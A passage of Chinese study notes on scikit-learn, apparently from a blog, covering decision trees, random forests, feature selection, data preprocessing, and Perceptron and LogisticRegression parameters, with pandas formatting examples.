&amp; splitter</strong></li></ul><p>  random_state用来设置分枝中的随机模式的参数，默认None，在高维度时随机性会表现更明显，低维度的数据（比如鸢尾花数据集），随机性几乎不会显现。输入任意整数，会一直长出同一棵树，让模型稳定下来。</p><p>  splitter也是用来控制决策树中的随机选项的，有两种输入值，输入”best”，决策树在分枝时虽然随机，但是还是会优先选择更重要的特征进行分枝（重要性可以通过属性feature_importances_查看），输入“random”，决策树在分枝时会更加随机，树会因为含有更多的不必要信息而更深更大，并因这些不必要信息而降低对训练集的拟合。这也是防止过拟合的一种方式。当你预测到你的模型会过拟合，用这两个参数来帮助你降低树建成之后过拟合的可能性。当然，树一旦建成，我们依然是使用剪枝参数来防止过拟合</p><h4><span id="剪枝策略">剪枝策略</span></h4><ul><li><strong>max_depth</strong></li></ul><p>​  限制树的最大深度，超过设定深度的树枝全部剪掉</p><ul><li><p><strong>min_samples_leaf &amp; min_samples_split</strong></p><p>min_samples_leaf限定，一个节点在分枝后的每个子节点都必须包含至少min_samples_leaf个训练样本，否则分枝就不会发生，或者，分枝会朝着满足每个子节点都包含min_samples_leaf个样本的方向去发生。一般搭配max_depth使用，在回归树中有神奇的效果，可以让模型变得更加平滑。这个参数的数量设置得太小会引起过拟合，设置得太大就会阻止模型学习数据。一般来说，建议从&#x3D;5开始使用。如果叶节点中含有的样本量变化很大，建议输入浮点数作为样本量的百分比来使用。同时，这个参数可以保证每个叶子的最小尺寸，可以在回归问题中避免低方差，过拟合的叶子节点出现。对于类别不多的分类问题，&#x3D;1通常就是最佳选择。</p><p>min_samples_split限定，一个节点必须要包含至少min_samples_split个训练样本，这个节点才允许被分枝，否则分枝就不会发生。</p></li></ul><h3><span id="回归树">回归树</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeRegressor</span><br><span class="line">regr_1 = DecisionTreeRegressor(max_depth=<span class="number">2</span>)</span><br><span class="line">regr_1.fit(X, y)</span><br><span class="line">y_1 = regr_1.predict(X_test)</span><br></pre></td></tr></table></figure><h3><span id="随机森林">随机森林</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line">wine = load_wine()</span><br><span class="line">wine.data</span><br><span class="line">wine.target</span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(wine.data,wine.target,test_size=<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clf = DecisionTreeClassifier(random_state=0)</span></span><br><span class="line">rfc = RandomForestClassifier(random_state=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#clf = clf.fit(Xtrain,Ytrain)</span></span><br><span class="line">rfc = rfc.fit(Xtrain,Ytrain)</span><br><span class="line"><span class="comment">#score_c = clf.score(Xtest,Ytest)</span></span><br><span class="line">score_r = rfc.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#交叉验证：是数据集划分为n分，依次取每一份做测试集，每n-1份做训练集，多次训练模型以观测模型稳定性的方法</span></span><br><span class="line"></span><br><span class="line">rfc_l = []</span><br><span class="line">clf_l = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    rfc = RandomForestClassifier(n_estimators=<span class="number">25</span>)</span><br><span class="line">    rfc_s = cross_val_score(rfc,wine.data,wine.target,cv=<span class="number">10</span>).mean()</span><br><span class="line">    rfc_l.append(rfc_s)</span><br><span class="line">    clf = DecisionTreeClassifier()</span><br><span class="line">    clf_s = cross_val_score(clf,wine.data,wine.target,cv=<span class="number">10</span>).mean()</span><br><span class="line">    clf_l.append(clf_s)</span><br><span class="line">    </span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>),rfc_l,label = <span class="string">&quot;Random Forest&quot;</span>)</span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>),clf_l,label = <span class="string">&quot;Decision Tree&quot;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#是否有注意到，单个决策树的波动轨迹和随机森林一致？</span></span><br><span class="line"><span class="comment">#再次验证了我们之前提到的，单个决策树的准确率越高，随机森林的准确率也会越高</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>随机森林填充数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">X_missing_reg = X_missing.copy()</span><br><span class="line">sortindex = np.argsort(X_missing_reg.isnull().<span class="built_in">sum</span>(axis=<span class="number">0</span>)).values</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sortindex:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#构建我们的新特征矩阵和新标签</span></span><br><span class="line">    df = X_missing_reg</span><br><span class="line">    fillc = df.iloc[:,i]</span><br><span class="line">    df = pd.concat([df.iloc[:,df.columns != i],pd.DataFrame(y_full)],axis=<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#在新特征矩阵中，对含有缺失值的列，进行0的填补</span></span><br><span class="line">    df_0 =SimpleImputer(missing_values=np.nan,</span><br><span class="line">                        strategy=<span class="string">&#x27;constant&#x27;</span>,fill_value=<span class="number">0</span>).fit_transform(df)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#找出我们的训练集和测试集</span></span><br><span class="line">    Ytrain = fillc[fillc.notnull()]</span><br><span class="line">    Ytest = fillc[fillc.isnull()]</span><br><span class="line">    Xtrain = df_0[Ytrain.index,:]</span><br><span class="line">    Xtest = df_0[Ytest.index,:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#用随机森林回归来填补缺失值</span></span><br><span class="line">    rfc = RandomForestRegressor(n_estimators=<span class="number">100</span>)</span><br><span class="line">    rfc = rfc.fit(Xtrain, Ytrain)</span><br><span class="line">    Ypredict = rfc.predict(Xtest)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#将填补好的特征返回到我们的原始的特征矩阵中</span></span><br><span class="line">    X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),X_missing_reg.columns[i]] = Ypredict</span><br><span class="line">    <span class="comment"># X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),i] = Ypredict 可能报错</span></span><br></pre></td></tr></table></figure><h3><span id="预处理">预处理</span></h3><h4><span id="方差过滤"><strong>方差过滤</strong></span></h4><p>比如一个特征本身的方差很小，就表示样本在这个特征上基本没有差异，可能特征中的大多数值都一样，甚至整个特征的取值都相同，那这个特征对于样本区分没有什么作用<strong>所以无论接下来的特征工程要做什么，都要优先消除方差为0的特征</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> VarianceThreshold</span><br><span class="line">selector = VarianceThreshold() <span class="comment">#实例化，不填参数默认方差为0</span></span><br><span class="line">X_var0 = selector.fit_transform(X) <span class="comment">#获取删除不合格特征之后的新特征矩阵</span></span><br><span class="line"><span class="comment"># 过滤一半的变量</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">X_fsvar = VarianceThreshold(np.median(X.var().values)).fit_transform(X) X.var().values</span><br><span class="line">np.median(X.var().values)</span><br></pre></td></tr></table></figure><h4><span id="卡方过滤">卡方过滤</span></h4><p>专门针对离散型标签（即分类问题）的相关性过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier <span class="keyword">as</span> RFC</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> SelectKBest</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> chi2</span><br><span class="line"><span class="comment">#假设在这里我一直我需要300个特征</span></span><br><span class="line">X_fschi = SelectKBest(chi2, k=<span class="number">300</span>).fit_transform(X_fsvar, y)</span><br><span class="line">X_fschi.shape</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fschi,y,cv=<span class="number">5</span>).mean()</span><br><span class="line"></span><br><span class="line">chivalue, pvalues_chi = chi2(X_fsvar,y)</span><br><span class="line"><span class="comment">#k取多少？我们想要消除所有p值大于设定值，比如0.05或0.01的特征：</span></span><br><span class="line">k = chivalue.shape[<span class="number">0</span>] - (pvalues_chi &gt; <span class="number">0.05</span>).<span class="built_in">sum</span>()</span><br><span class="line">X_fschi = SelectKBest(chi2, k=填写具体的k).fit_transform(X_fsvar, y)</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fschi,y,cv=<span class="number">5</span>).mean()</span><br></pre></td></tr></table></figure><h4><span id="f检验只能检验线性关系">F检验（只能检验线性关系）</span></h4><p>它即可以做回归也可以做分类，因此包含<strong>feature_selection.f_classif</strong>（F检验分类）和<strong>feature_selection.f_regression</strong>（F检验回</p><p>归）两个类。其中F检验分类用于标签是离散型变量的数据，而F检验回归用于标签是连续型变量的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> f_classif</span><br><span class="line">F, pvalues_f = f_classif(X_fsvar,y) </span><br><span class="line">k = F.shape[<span class="number">0</span>] - (pvalues_f &gt; <span class="number">0.05</span>).<span class="built_in">sum</span>()</span><br><span class="line">X_fsF = SelectKBest(f_classif, k=填写具体的k).fit_transform(X_fsvar, y)</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fsF,y,cv=<span class="number">5</span>).mean()</span><br></pre></td></tr></table></figure><h4><span id="互信息法">互信息法</span></h4><h3><span id="特征工程">特征工程</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Normalization 归一化 一般来说将数据分部在0到1之间</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line">data = [[-<span class="number">1</span>, <span class="number">2</span>], [-<span class="number">0.5</span>, <span class="number">6</span>], [<span class="number">0</span>, <span class="number">10</span>], [<span class="number">1</span>, <span class="number">18</span>]]</span><br><span class="line">scaler = MinMaxScaler()</span><br><span class="line"><span class="comment"># scaler = MinMaxScaler(feature_range=[5,10])</span></span><br><span class="line">result_ = scaler.fit_transform(data) <span class="comment">#训练和导出结果一步达成</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sklearn 里面处理标准化这些需要二维数组</span></span><br><span class="line"><span class="comment"># Standardization 标准化 将数据处理成标准正态分布形式</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">data = [[-<span class="number">1</span>, <span class="number">2</span>], [-<span class="number">0.5</span>, <span class="number">6</span>], [<span class="number">0</span>, <span class="number">10</span>], [<span class="number">1</span>, <span class="number">18</span>]]</span><br><span class="line">scaler = StandardScaler() <span class="comment">#实例化</span></span><br><span class="line">res = scaler.fit_transform(data) <span class="comment">#使用fit_transform(data)一步达成结果</span></span><br><span class="line">res.mean()</span><br><span class="line">res.std()</span><br></pre></td></tr></table></figure><h3><span id="数据预处理">数据预处理</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sklearn 里面处理标准化这些需要二维数组</span></span><br><span class="line">shape(-<span class="number">1</span>,<span class="number">1</span>) <span class="comment"># 变成一列</span></span><br><span class="line">shape(<span class="number">1</span>,-<span class="number">1</span>) <span class="comment"># 变成一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果数据自带索引，导入时需指定索引列</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">r&quot;C:\work\learnbetter\micro-class\week 3 Preprocessing\Narrativedata.csv&quot;</span>,index_col=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 缺失数据处理</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">r&quot;C:\work\learnbetter\micro-class\week 3 </span></span><br><span class="line"><span class="string">Preprocessing\Narrativedata.csv&quot;</span>,index_col=<span class="number">0</span>)</span><br><span class="line">data.head()</span><br><span class="line">data.loc[:,<span class="string">&quot;Age&quot;</span>] = data.loc[:,<span class="string">&quot;Age&quot;</span>].fillna(data.loc[:,<span class="string">&quot;Age&quot;</span>].median())</span><br><span class="line"><span class="comment">#.fillna 在DataFrame里面直接进行填补</span></span><br><span class="line">data.dropna(axis=<span class="number">0</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#.dropna(axis=0)删除所有有缺失值的行，.dropna(axis=1)删除所有有缺失值的列</span></span><br><span class="line"><span class="comment">#参数inplace，为True表示在原数据集上进行修改，为False表示生成一个复制对象，不修改原数据，默认False</span></span><br><span class="line">                   </span><br><span class="line">                   </span><br><span class="line"><span class="comment"># sklearn只能处理数值型数据，因此要将标签转为数据</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line">y = data.iloc[:,-<span class="number">1</span>] <span class="comment">#要输入的是标签，不是特征矩阵，所以允许一维</span></span><br><span class="line">le = LabelEncoder() <span class="comment">#实例化</span></span><br><span class="line">label=le.fit_transform(y)</span><br><span class="line">data.iloc[:,-<span class="number">1</span>] = label <span class="comment">#让标签等于我们运行出来的结果</span></span><br><span class="line">                   </span><br><span class="line">                  </span><br></pre></td></tr></table></figure><h3><span id="逻辑回归">逻辑回归</span></h3><h3><span id="perceptrons">Perceptrons</span></h3><table><thead><tr><th>参数名称</th><th>参数取值</th><th>参数解释</th></tr></thead><tbody><tr><td>penalty</td><td>默认&#x3D;None，即不加惩罚项，‘l2’（L2正则） or ‘l1’（L1正则） or ‘elasticnet’（混合正则）</td><td>惩罚项，加上惩罚项主要为了避免模型过拟合风险</td></tr><tr><td>alpha</td><td>默认&#x3D;0.0001，取值为浮点数</td><td>如果penalty不为None，则正则化项需要乘上这个数</td></tr><tr><td>l1_ratio</td><td>默认&#x3D;0.15，取值在[0,1]</td><td>一般只在penalty&#x3D;elasticnet时用，当l1_ratio &#x3D;0就是L2正则，当l1_ratio &#x3D;1就是L1正则，当在(0,1)之间就是混合正则</td></tr><tr><td>fit_intercept</td><td>bool值，默认&#x3D;True</td><td>是否对参数 截距项b进行估计，若为False则数据应是中心化的</td></tr><tr><td>max_iter</td><td>int整数，默认&#x3D;1000</td><td>最大迭代次数，哪怕损失函数依旧大于0&#x2F;</td></tr><tr><td>tol</td><td>float or None，默认&#x3D;10^(-3)</td><td>迭代停止的标准。如果不为None，那么当loss-pre-loss&lt;tol的时候，就会停止迭代。因为当前迭代造成的损失函数下降太小了，迭代下去对loss影响不大了。</td></tr><tr><td>shuffle</td><td>bool值，默认&#x3D;True</td><td>每轮训练后是否打乱数据</td></tr><tr><td>verbose</td><td>取值为整数，默认&#x3D;0</td><td>verbose &#x3D; 0 为不在标准输出流输出日志信息，verbose &#x3D; 1 为输出进度条记录；verbose &#x3D; 2 为每个epoch输出一行记录</td></tr><tr><td>eta0</td><td>取值双精度浮点型double，默认&#x3D;1</td><td>学习率，决定梯度下降时每次参数变化的幅度</td></tr><tr><td>n_jobs</td><td>取值为 int or None，默认&#x3D;None</td><td>在多分类时使用的CPU数量，默认为None（或1），若为-1则使用所有CPU</td></tr><tr><td>random_state</td><td>取值为int, RandomState instance or None，默认&#x3D;None</td><td>当 shuffle &#x3D;True时，用于打乱训练数据</td></tr><tr><td>n_iter_no_change</td><td>取值int，默认&#x3D;5</td><td>在提前停止之前等待验证分数无改进的迭代次数，用于提前停止迭代</td></tr><tr><td>early_stopping</td><td>取值bool值，默认&#x3D;False</td><td>当验证得分不再提高时是否设置提前停止来终止训练。若设置此项，当验证得分在n_iter_no_change轮内没有提升时提前停止训练</td></tr><tr><td>class_weight</td><td>取值为dict, {class_label: weight} 或者 “balanced”或者None，默认&#x3D;None</td><td>用于拟合参数时，每一类的权重是多少。当为None时，所有类的权重为1，等权重；当为balanced时，某类的权重为该类频数的反比，当为字典时，则key为类的标签，值为对应的权重</td></tr><tr><td>warm_start</td><td>取值为bool，默认&#x3D;False</td><td>若为True则调用前一次设置的参数，使用新设置的参数</td></tr></tbody></table><ul><li><p>eta0 学习率</p><p>类似于步长，步长太小收敛太慢，步长太长，反复横跳，无法收敛。</p></li></ul><h3><span id="logisticregression">LogisticRegression</span></h3><ul><li><p>penalty：惩罚项，str类型，可选参数为l1和l2，默认为l2。用于指定惩罚项中使用的规范。newton-cg、sag和lbfgs求解算法只支持L2规范。L1G规范假设的是模型的参数满足拉普拉斯分布，L2假设的模型参数满足高斯分布，所谓的范式就是加上对参数的约束，使得模型更不会过拟合(overfit)，但是如果要说是不是加了约束就会好，这个没有人能回答，只能说，加约束的情况下，理论上应该可以获得泛化能力更强的结果。</p></li><li><p>dual：对偶或原始方法，bool类型，默认为False。对偶方法只用在求解线性多核(liblinear)的L2惩罚项上。当样本数量&gt;样本特征的时候，dual通常设置为False。</p></li><li><p>tol：停止求解的标准，float类型，默认为1e-4。就是求解到多少的时候，停止，认为已经求出最优解。</p></li><li><p>c：正则化系数λ的倒数，float类型，默认为1.0。必须是正浮点型数。像SVM一样，越小的数值表示越强的正则化。</p></li><li><p>fit_intercept：是否存在截距或偏差，bool类型，默认为True。</p></li><li><p>intercept_scaling：仅在正则化项为”liblinear”，且fit_intercept设置为True时有用。float类型，默认为1。</p></li><li><p>class_weight：用于标示分类模型中各种类型的权重，可以是一个字典或者’balanced’字符串，默认为不输入，也就是不考虑权重，即为None。如果选择输入的话，可以选择balanced让类库自己计算类型权重，或者自己输入各个类型的权重。举个例子，比如对于0,1的二元模型，我们可以定义class_weight&#x3D;{0:0.9,1:0.1}，这样类型0的权重为90%，而类型1的权重为10%。如果class_weight选择balanced，那么类库会根据训练样本量来计算权重。某种类型样本量越多，则权重越低，样本量越少，则权重越高。当class_weight为balanced时，类权重计算方法如下：n_samples &#x2F; (n_classes * np.bincount(y))。n_samples为样本数，n_classes为类别数量，np.bincount(y)会输出每个类的样本数，例如y&#x3D;[1,0,0,1,1],则np.bincount(y)&#x3D;[2,3]。<br>那么class_weight有什么作用呢？</p><p>在分类模型中，我们经常会遇到两类问题：<br>第一种是误分类的代价很高。比如对合法用户和非法用户进行分类，将非法用户分类为合法用户的代价很高，我们宁愿将合法用户分类为非法用户，这时可以人工再甄别，但是却不愿将非法用户分类为合法用户。这时，我们可以适当提高非法用户的权重。<br>第二种是样本是高度失衡的，比如我们有合法用户和非法用户的二元样本数据10000条，里面合法用户有9995条，非法用户只有5条，如果我们不考虑权重，则我们可以将所有的测试集都预测为合法用户，这样预测准确率理论上有99.95%，但是却没有任何意义。这时，我们可以选择balanced，让类库自动提高非法用户样本的权重。提高了某种分类的权重，相比不考虑权重，会有更多的样本分类划分到高权重的类别，从而可以解决上面两类问题。</p></li><li><p>random_state：随机数种子，int类型，可选参数，默认为无，仅在正则化优化算法为sag,liblinear时有用。</p></li><li><p>solver：优化算法选择参数，只有五个可选参数，即newton-cg,lbfgs,liblinear,sag,saga。默认为liblinear。solver参数决定了我们对逻辑回归损失函数的优化方法，有四种算法可以选择，分别是：</p></li><li><p>liblinear：使用了开源的liblinear库实现，内部使用了坐标轴下降法来迭代优化损失函数。</p></li><li><p>lbfgs：拟牛顿法的一种，利用损失函数二阶导数矩阵即海森矩阵来迭代优化损失函数。</p></li><li><p>newton-cg：也是牛顿法家族的一种，利用损失函数二阶导数矩阵即海森矩阵来迭代优化损失函数。</p></li><li><p>sag：即随机平均梯度下降，是梯度下降法的变种，和普通梯度下降法的区别是每次迭代仅仅用一部分的样本来计算梯度，适合于样本数据多的时候。</p></li><li><p>saga：线性收敛的随机优化算法的的变重。</p></li></ul><p>总结：<br>liblinear适用于小数据集，而sag和saga适用于大数据集因为速度更快。<br>对于多分类问题，只有newton-cg,sag,saga和lbfgs能够处理多项损失，而liblinear受限于一对剩余(OvR)。啥意思，就是用liblinear的时候，如果是多分类问题，得先把一种类别作为一个类别，剩余的所有类别作为另外一个类别。一次类推，遍历所有类别，进行分类。<br>newton-cg,sag和lbfgs这三种优化算法时都需要损失函数的一阶或者二阶连续导数，因此不能用于没有连续导数的L1正则化，只能用于L2正则化。而liblinear和saga通吃L1正则化和L2正则化。<br>同时，sag每次仅仅使用了部分样本进行梯度迭代，所以当样本量少的时候不要选择它，而如果样本量非常大，比如大于10万，sag是第一选择。但是sag不能用于L1正则化，所以当你有大量的样本，又需要L1正则化的话就要自己做取舍了。要么通过对样本采样来降低样本量，要么回到L2正则化。<br>从上面的描述，大家可能觉得，既然newton-cg, lbfgs和sag这么多限制，如果不是大样本，我们选择liblinear不就行了嘛！错，因为liblinear也有自己的弱点！我们知道，逻辑回归有二元逻辑回归和多元逻辑回归。对于多元逻辑回归常见的有one-vs-rest(OvR)和many-vs-many(MvM)两种。而MvM一般比OvR分类相对准确一些。郁闷的是liblinear只支持OvR，不支持MvM，这样如果我们需要相对精确的多元逻辑回归时，就不能选择liblinear了。也意味着如果我们需要相对精确的多元逻辑回归不能使用L1正则化了。<br>max_iter：算法收敛最大迭代次数，int类型，默认为10。仅在正则化优化算法为newton-cg, sag和lbfgs才有用，算法收敛的最大迭代次数。</p><ul><li><p>multi_class：分类方式选择参数，str类型，可选参数为ovr和multinomial，默认为ovr。ovr即前面提到的one-vs-rest(OvR)，而multinomial即前面提到的many-vs-many(MvM)。如果是二元逻辑回归，ovr和multinomial并没有任何区别，区别主要在多元逻辑回归上。</p></li><li><p>OvR和MvM有什么不同<em>？</em><br>OvR的思想很简单，无论你是多少元逻辑回归，我们都可以看做二元逻辑回归。具体做法是，对于第K类的分类决策，我们把所有第K类的样本作为正例，除了第K类样本以外的所有样本都作为负例，然后在上面做二元逻辑回归，得到第K类的分类模型。其他类的分类模型获得以此类推。<br>而MvM则相对复杂，这里举MvM的特例one-vs-one(OvO)作讲解。如果模型有T类，我们每次在所有的T类样本里面选择两类样本出来，不妨记为T1类和T2类，把所有的输出为T1和T2的样本放在一起，把T1作为正例，T2作为负例，进行二元逻辑回归，得到模型参数。我们一共需要T(T-1)&#x2F;2次分类。<br>可以看出OvR相对简单，但分类效果相对略差（这里指大多数样本分布情况，某些样本分布下OvR可能更好）。而MvM分类相对精确，但是分类速度没有OvR快。如果选择了ovr，则4种损失函数的优化方法liblinear，newton-cg,lbfgs和sag都可以选择。但是如果选择了multinomial,则只能选择newton-cg, lbfgs和sag了。</p></li><li><p>verbose：日志冗长度，int类型。默认为0。就是不输出训练过程，1的时候偶尔输出结果，大于1，对于每个子模型都输出。</p></li><li><p>warm_start：热启动参数，bool类型。默认为False。如果为True，则下一次训练是以追加树的形式进行（重新使用上一次的调用作为初始化）。</p></li><li><p>n_jobs：并行数。int类型，默认为1。1的时候，用CPU的一个内核运行程序，2的时候，用CPU的2个内核运行程序。为-1的时候，用所有CPU的内核运行程序。</p></li></ul><h2><span id="做题遇到的">做题遇到的</span></h2><h3><span id="数据格式化map">数据格式化map</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 df2 的获奖时间格式化为 x月x日</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_format</span>(<span class="params">x</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> x.strftime(<span class="string">&quot;%m月%d日&quot;</span>)</span><br><span class="line"></span><br><span class="line">df2[<span class="string">&#x27;获奖时间&#x27;</span>] = df2[<span class="string">&#x27;获奖时间&#x27;</span>].<span class="built_in">map</span>(time_format)</span><br><span class="line"><span class="comment"># 等同于</span></span><br><span class="line">df2.获奖时间.<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.strftime(<span class="string">&#x27;%m月%d日&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">turn_percentage</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%.2f%%&#x27;</span> % (x * <span class="number">100</span>);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>]=q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>].apply(turn_percentage)</span><br><span class="line">q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>]=q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="string">&quot;&#123;:.2%&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示小数</span></span><br><span class="line">pd.set_option(<span class="string">&#x27;precision&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># map传字典</span></span><br><span 